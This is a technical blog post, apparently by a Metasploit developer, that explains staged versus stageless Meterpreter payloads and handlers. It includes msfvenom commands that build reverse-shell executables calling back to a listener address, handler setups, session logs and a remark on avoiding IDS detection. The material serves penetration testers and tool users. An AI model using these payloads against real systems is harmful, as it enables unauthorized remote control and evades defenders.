---
categories:
- Metasploit
- Meterpreter
- Security
comments: true
date: 2016-10-05T10:46:58+10:00
title: Staged vs Stageless Handlers
---

Metasploit comes with a variety of payloads, as we all know. Those payloads come in a few different types, and vary depending on platform. Of those types, there are two major "categories" available with a key difference that is often not understood. They are `staged` and `stageless` payloads.

The purpose of this post is to talk about the differences between these two, particularly in the context of Meterpreter and the Metasploit handlers. I'll also cover off what happens with TCP payloads/handlers, so that it's clear how it works and what you can do to avoid a common pitfall and reduce noise on the wire.

Let's dive in.

<!--more-->

## Staged payloads

The classic staged payload in Metasploit is `windows/meterpreter/reverse_tcp`, it's probably fair to assume that everyone who is reading this has used this payload in the past. When using `msfvenom` with `windows/meterpreter/reverse_tcp` the binary that is generated contains something called a **stager**. In this case, the stager is a minimal amount of code that does the following:

* Establishes an active TCP connection back to Metasploit on a given address and port.
* Reads 4 bytes from Metasploit, which indicates the size of the payload.
* Allocates a block of memory that is `RWX` (readable, writable and executable) of a sufficient size.
* Reads the rest of the payload from the wire, and writes it to the allocated block of memory.
* When finished, control is passed directly to the start of the payload so that it can execute, which in this case involves the running of a patched DLL header that does the following:
    * Loads itself (ie. `metsrv`) into memory correctly using [Reflective DLL Injection][].
    * Calculates the offset to the configuration block.
    * Patches the configuration block so that it contains the current open socket handle that is being used to talk to Metasploit.
    * Executes `dllmain()` in the newly loaded `metsrv`, passing in a pointer to the configuration block so that `metsrv` can take control of the communication.
* With `metsrv` running, more magic happens:
    * SSL is negotiated on the socket so that communications from this point are all encrypted.
    * TLV packet communication can then commence with Metasploit.

You'll notice that the stager is quite dumb and blind, and makes a bunch of assumptions around what it's connecting to. This is deliberate because adding any other smarts or complexity increase the size of the stager. As we all know, stager size is an issue in the case of certain exploits. If the stager is too big, then we can't squeeze it into the small shellcode space that's available in certain exploitation contexts (the classic [MS08-067][] bug is a great example of this).

As a result of these assumptions, Metasploit also has to assume that the inbound connection is staged, and send the correct bytes in order when a new connection comes in. This means that the handler will, in unison with the stager, do the following:

* Listen on a given address:port.
* Receive a new connection.
* Generate a payload (in this case it's the first stage of Meterpreter, and comes in the form of a dynamically patched `metsrv` DLL followed by a configuration block).
* Send a 4-byte block that represents the size of the incoming payload.
* Send the payload to the target (this is where you'll see `Sending stage (XXX bytes) to YYY`).
* Wait for the payload to be executed and for the host to reach back out to Metasploit, then continue on with establishing a valid Meterpreter session, which involves:
    * Negotiating SSL on the existing socket.
    * Querying for basic system information.
    * Asking the target which Meterpreter commands it currently supports (which allows for checks to see which extensions are loaded).
    * Loading `stdapi` if it isn't present.
    * Loading `priv` if it isn't present.
    * Doing some other local accounting to track the new session.

So the process here is rather involved, but thankfully completely opaque to the user who shouldn't have to care. The important thing is that, at this point, we have a valid Meterpreter session running on the target.

## Stageless payloads

Stageless payloads still seem to be relatively unknown by most Metasploit users, partly because they aren't talked about much, partly because of documentation, and partly because they're easily hidden. The staged equivalent of the above staged payload (`windows/meterpreter/reverse_tcp`) is `windows/meterpreter_reverse_tcp`. Note the use of `_` instead of the second `/` in the payload name. The key differences here are:

* There is no "dumb" stager required.
* The payload includes "all that is required to get a session running", which in this case is a copy of the `metsrv` DLL.
* Given that `metsrv` is baked in, it is able to establish communications straight up, with SSL encryption on the socket.

The big ticket item here is that no communications are made without encryption. This means that any IDS applications running do not see a raw PE file (ie. `metsrv`) go over the wire during the staging process, and hence it is more likely to not get caught. However, given that `metsrv` is baked into the original payload, it won't come as a surprise that the payload is substantially larger.

So to recap, when a stageless payload is fired, the following happens:

* `metsrv` is invoked immediately with a pointer to the configuration block that was baked into the payload.
* Any extensions that were added at payload generation time (via the `EXTENSIONS` parameter) are loaded in, again using [Reflective DLL Injection][].
* The configuration block doesn't include an active socket handle, and so `metsrv` looks at the configuration to determine where it should connect to.
* It creates a new TCP connection and calls Metasploit on the given address:port.
* The socket is  _immediately_ wrapped in SSL.
* It is then able to talk via TLV packets with Metasploit over an encrypted transport to finish setting up the session.

On the Metasploit side, things are a little different as well:

* The handler creates a listener using the same mechanism as with staged.
* When a new connection comes in, it is assumed that the target is stageless, and hence payload generation does not occur. This means that the 4-byte size and the payload itself are not sent at all.
* It is assumed that the connection is able to talk SSL, and so the SSL handshake starts immediately.
* The rest of the session initialisation stuff happens as per the staged session.

There are couple of small but very important differences here. Note that you won't see the `Sending stage (XXX bytes) to YYY` message appear, because it doesn't actually happen!

## Connecting staged payloads to stageless handlers

Doing this is a bad idea. If a staged payload connects to a stageless handler, it will expect to receive a 4-byte size block followed by the payload before it can do anything else. This clearly won't happen because the handler is not configured to send either of these things. Needless to say, you won't get a session. Instead, you'll get a sad.

## Connecting stageless payloads to staged handlers

This scenario isn't as crazy as it sounds, especially given that Meterpreter now has the ability to reconnect to Metasploit when:

* Network communication is broken.
* The user puts the session to sleep.
* The user switches transports.

More on this later. For now, the important thing to note is that Meterpreter does actually make an attempt to handle the case where it establishes a connection to a staged handler. When a new connection is established to Metasploit, Meterpreter flushes the socket of any data that's on it before the SSL negotiation happens. This means that the 4-byte size block and payload are effectively thrown away.

While this is handy, bear in mind that Metasploit _still sends the stage_. The magic of avoiding raw PE files heading over the wire is immediately lost if you connect stageless Meterpreter to a staged listener. You also make more noise as you're sending a large payload that doesn't need to be sent.

Don't do this if you can avoid it.

### A known issue

Currently we have an issue with staged listeners and stageless payloads that rears its ugly head quite often. When the connection is established, Metasploit can spit an error out that looks something like this:

```
OpenSSL::SSL::SSLError SSL_accept returned=1 errno=0 state=unknown state: tlsv1 alert protocol version
```

If you see this appear, it's safe to say that the session is effectively dead. Chances are that you won't see this session come back at all. The development team are aware of this and are currently looking into why this is happening. I'm sorry to say that we don't have a solution at this point in time, but I am confident we'll get to the bottom of it at some point soon. We have the might of [Brent Cook][] on hand, and this man is a machine. I'm sure it's just a matter of time.

## Session reconnection

As I've already mentioned, sessions are able to reconnect magically thanks to some changes that were put into Meterpreter last year. This can happen when:

* Network issues prevent communication from working.
* The user switches to a new transport.
* The user puts the session to sleep (using the rather unintuitively named `sleep` command), and the session then wakes up.

In each case, Meterpreter will connect back to Metasploit on the transport that is considered active (I won't go into transport stuff in this post, it's already big enough). In our current scenario, there is just one transport and that's the one the payload was created with.

In the case of stageless payloads, the behaviour is exactly the same as when the session first kicks off. It connects to the stageless listener and things go swimmingly.

However, in the case of staged payloads, we are now in the situation where the staged listener receives a connection from what is now effectively a stageless connection because Meterpreter is already running and set up. We end up sending the 4-byte block and the first stage down the wire again. As mentioned before, this can be OK if Meterpreter successfully skips the payload during the socket flush, but as we're seeing more and more, the dreaded OpenSSL error is rearing its ugly head and causing things to die.

I'd like to state for the record that even if reconnection did function without failure in this situation, it's still better to have configuration set up so that you never end up pointing stageless payloads at staged handlers. So with that in mind, let's look at how we do that, as this will also work around the issue that we're seeing at the same time.

### A TCP reconnection workaround

Last year, the notion of a _configuration block_ was added to Metasploit and Meterpreter. This configuration block (documented on the [wiki][config-wiki]), contains a bunch of stuff including transport configuration details. When a staged payload fires, the generated payload contains the configuration block that matches the configuration of the handler.

Therefore, in the case of TCP, it contains both the `LHOST` and `LPORT` settings that are **currently active in the handler**. These settings are _not necessarily the same_ as the `LHOST` and `LPORT` settings that were used when the staged payload was generated using `msfvenom`.

This means that, during the staging process, we have the ability to give a different configuration to Meterpreter than we gave the stager during payload generation time. There's a window of opportunity here! Instead of passing in the same configuration as the current staged listener, we can instead pass in transport details that point to the _stageless_ version. This means the current transport configuration would point to the stageless listener even though the active socket is talking to the staged listener.

When communication drops for any of the above reasons, Meterpreter will look at this transport configuration when it attempts to reconnect, and thus will direct itself at the _stageless_ listener instead. Glorious! So how do we do this? It's very simple.

We begin by creating a stageless listener:
```
msf exploit(handler) > set payload windows/meterpreter_reverse_tcp
payload => windows/meterpreter_reverse_tcp
msf exploit(handler) > set LHOST 10.1.10.35
LHOST => 10.1.10.35
msf exploit(handler) > set LPORT 8000
LPORT => 8000
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       10.1.10.35       yes       The listen address
   LPORT       8000             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] [2016.10.05-12:25:23] Started reverse TCP handler on 10.1.10.35:8000
msf exploit(handler) > [*] [2016.10.05-12:25:23] Starting the payload handler...
```
When we generate a matching payload for this listener we can use the following:
```
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.1.10.35 LPORT=8000 -f exe -o /tmp/stageless8000.exe
```

Next we create a staged listener, but we do the following:

1. We leave `LPORT` set to `8000`, because this is what we want the transport configuration to contain.
1. We set `ReverseListenerBindPort` to something different (`9000` in our example), as this forces the listener to bind to another port, which we will point our staged payload at.

```
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set ReverseListenerBindPort 9000
ReverseListenerBindPort => 9000
msf exploit(handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.1.10.35       yes       The listen address
   LPORT     8000             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] [2016.10.05-12:29:48] Started reverse TCP handler on 10.1.10.35:9000
msf exploit(handler) > [*] [2016.10.05-12:29:48] Starting the payload handler...
```
This time, when we create a payload for this listener, we use the `ReverseListenerBindPort` value for `LPORT`:
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.10.35 LPORT=9000 -f exe -o /tmp/staged9000.exe
```

To recap, we now have:

* A staged payload that will connect to Metasploit on port `9000`.
* A staged listener listening on port `9000`, but configured to generate a payload that contains a configuration block that references port `8000` instead.

When the staged payload runs, it will connect to Metasploit on port `9000`. If the session needs to _reconnect_ for any reason, Meterpreter will be responsible for that reconnection. Therefore, the configuration block will be referenced instead of the stager configuration, and it will use port `8000` where the stageless listener is active. Here's an example:
```
msf exploit(handler) >
[*] [2016.10.05-12:34:27] Sending stage (957999 bytes) to 10.1.10.44
[*] Meterpreter session 1 opened (10.1.10.35:9000 -> 10.1.10.44:49282) at 2016-10-05 12:34:29 +1000
msf exploit(handler) > sessions

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  1   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:9000 -> 10.1.10.44:49282 (10.1.10.44)
```
Note the `Sending stage` message, and that we have the active connection on port `9000`. We can then put the session to sleep, and watch it come back on `8000`:
```
meterpreter > sleep 5
[*] Telling the target instance to sleep for 5 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 10.1.10.44 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 2 opened (10.1.10.35:8000 -> 10.1.10.44:49283) at 2016-10-05 12:35:55 +1000

msf exploit(handler) > sessions

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  2   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:8000 -> 10.1.10.44:49283 (10.1.10.44)
```
You'll see that the connection came back on port `8000`, and we didn't see the `Sending stage` message!

Win.

## What about HTTP/S?

Thankfully, the case with HTTP/S is very different. The HTTP/S handler has code in it that is able to determine if an incoming session is staged or stageless simply by looking at the incoming URI. The URI contains encoded information that the handler is able to parse, and hence can perform different functions depending on the content.

This means that regardless of how you generated your payload, you can always use the staged `reverse_http/s` handler and it will _Just Work &trade;_. Here's an example:

```
msf exploit(handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(handler) > set LPORT 7000
LPORT => 7000
msf exploit(handler) > unset ReverseListenerBindPort
Unsetting ReverseListenerBindPort...
msf exploit(handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.1.10.35       yes       The local listener hostname
   LPORT     7000             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] [2016.10.05-12:41:37] Started HTTPS reverse handler on https://10.1.10.35:7000
msf exploit(handler) > [*] [2016.10.05-12:41:37] Starting the payload handler...
```
With the listener set up, we can create both staged and stageless payloads that point to the same port:
```
$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.1.10.35 LPORT=7000 -f exe -o /tmp/staged7000.exe
$ msfvenom -p windows/meterpreter_reverse_https LHOST=10.1.10.35 LPORT=7000 -f exe -o /tmp/stageless7000.exe
```
When we run stageless, it gets picked up appropriately:
```
[*] [2016.10.05-12:43:55] https://10.1.10.35:7000 handling request from 10.1.10.44; (UUID: 6ivojknu) Redirecting stageless connection from /oDrA4oxsqwxAWEFZF6wogQ1JE465jU9x7b8re with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] [2016.10.05-12:43:55] https://10.1.10.35:7000 handling request from 10.1.10.44; (UUID: 6ivojknu) Attaching orphaned/stageless session...
[*] Meterpreter session 3 opened (10.1.10.35:7000 -> 10.1.10.44:49285) at 2016-10-05 12:43:55 +1000

msf exploit(handler) > sessions

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  2   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:8000 -> 10.1.10.44:49283 (10.1.10.44)
  3   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:7000 -> 10.1.10.44:49285 (10.1.10.44)
```
Again, note that there's no indication that a payload is being staged, instead we see that Metasploit has recognised the stageless payload. Here's what it looks like when we run staged payloads:
```
[*] [2016.10.05-12:44:44] https://10.1.10.35:7000 handling request from 10.1.10.44; (UUID: 6ivojknu) Staging Native payload...
[*] Meterpreter session 4 opened (10.1.10.35:7000 -> 10.1.10.44:49287) at 2016-10-05 12:44:44 +1000

msf exploit(handler) > sessions

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  2   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:8000 -> 10.1.10.44:49283 (10.1.10.44)
  3   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:7000 -> 10.1.10.44:49285 (10.1.10.44)
  4   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  10.1.10.35:7000 -> 10.1.10.44:49287 (10.1.10.44)
```
This payload requires staging, and Metasploit recognises it and sends the stage appropriately. We have both the staged and stageless sessions appearing on port `7000`. Finally, when we put the staged session to sleep, we should see that it knows how to handle this case as well:
```
msf exploit(handler) > sess -1
[*] Starting interaction with 4...

meterpreter > sleep 5
[*] Telling the target instance to sleep for 5 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 10.1.10.44 - Meterpreter session 4 closed.  Reason: User exit
msf exploit(handler) >
[*] [2016.10.05-12:47:11] https://10.1.10.35:7000 handling request from 10.1.10.44; (UUID: 6ivojknu) Attaching orphaned/stageless session...
[*] Meterpreter session 5 opened (10.1.10.35:7000 -> 10.1.10.44:49288) at 2016-10-05 12:47:11 +1000
```
The session comes back and Metasploit knows it's not a new stageless payload (so no stageless redirect happens), but determines that it's an active orphaned session.

## A cross-architecture migration issue

Unfortunately there is still a case where things can break, and it's all thanks to migration. When migrating, we know that we can cross architectures. That is, we can migrate from an x86 process to an x64 process, and vice versa. Once migrated, the running architecture of the session changes as well, **but the active transport is not aware of the change**. As a result if the session has to reconnect for any reason, we end up in a world of hurt.

This pain is caused by the fact that Metasploit isn't currently validating the architecture of a session when it connects back on stageless listeners. Instead, it is assumed. This means that Metasploit might think that a session is still x86 when in fact it's x64. We don't have a fix for this issue at the moment, so the best thing to do in the short term is have another listener set up that can handle another architecture, and then add a new transport once the session has been migrated.

We're actively working on solving this, so please sit tight.

Thanks for reading. Please feel free to leave feedback in the comments.

  [Reflective DLL Injection]: http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf
  [MS08-067]: https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
  [Brent Cook]: https://twitter.com/busterbcook
  [config-wiki]: https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Configuration
